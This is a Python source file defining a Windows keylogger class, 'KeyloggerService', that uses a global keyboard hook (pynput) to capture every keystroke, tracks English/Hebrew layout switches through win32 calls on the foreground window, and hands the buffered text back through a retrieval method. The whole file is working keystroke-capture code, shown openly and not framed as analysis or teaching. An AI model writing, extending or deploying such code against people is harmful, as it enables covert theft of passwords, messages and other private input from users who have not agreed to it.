import threading
import logging
from datetime import datetime
from pynput import keyboard
import win32gui, win32process, win32api

LANGUAGE_MAP = {
    1033: "English",
    1037: "Hebrew"
}

class KeyloggerService:
    def __init__(self):
        self._buffer = []
        self._lock = threading.Lock()
        self._is_saving = False
        self._listener = None
        self._current_language = self._get_current_language()
        logging.basicConfig(level=logging.ERROR, format='%(asctime)s [%(levelname)s] %(message)s')

        self._listener = keyboard.Listener(
            on_press=self.on_press,
            on_release=self.on_release
        )
        self._listener.start()

    def start_logging(self):
        self._is_saving = True

    def stop_logging(self):
        self._is_saving = False

    def stop_service(self):
        self._is_saving = False
        if self._listener:
            self._listener.stop()
            self._listener.join()
            self._listener = None

    def on_press(self, key):
        if not self._is_saving:
            return
        new_lang = self._get_current_language()
        if new_lang != self._current_language:
            with self._lock:
                self._buffer.append(f"[LANGUAGE_CHANGED: {new_lang}]")
            self._current_language = new_lang
        with self._lock:
            try:
                self._buffer.append(key.char)
            except AttributeError:
                if key == keyboard.Key.space:
                    self._buffer.append(" ")
                elif key == keyboard.Key.enter:
                    self._buffer.append("\n")
                elif key == keyboard.Key.tab:
                    self._buffer.append("\t")
                elif key == keyboard.Key.backspace and self._buffer:
                    self._buffer.pop()
                else:
                    self._buffer.append(f"[{key}]")

    def on_release(self, key):
        pass

    def get_buffer_data(self):
        with self._lock:
            data = "".join(self._buffer)
            self._buffer.clear()
        return data

    def _get_current_language(self):
        try:
            hwnd = win32gui.GetForegroundWindow()
            if hwnd == 0:
                return "Unknown"
            thread_id, _ = win32process.GetWindowThreadProcessId(hwnd)
            layout = win32api.GetKeyboardLayout(thread_id)
            return LANGUAGE_MAP.get(layout & 0xFFFF, f"Unknown({layout & 0xFFFF})")
        except Exception as e:
            logging.error("Error detecting language", exc_info=True)
            return "Unknown"
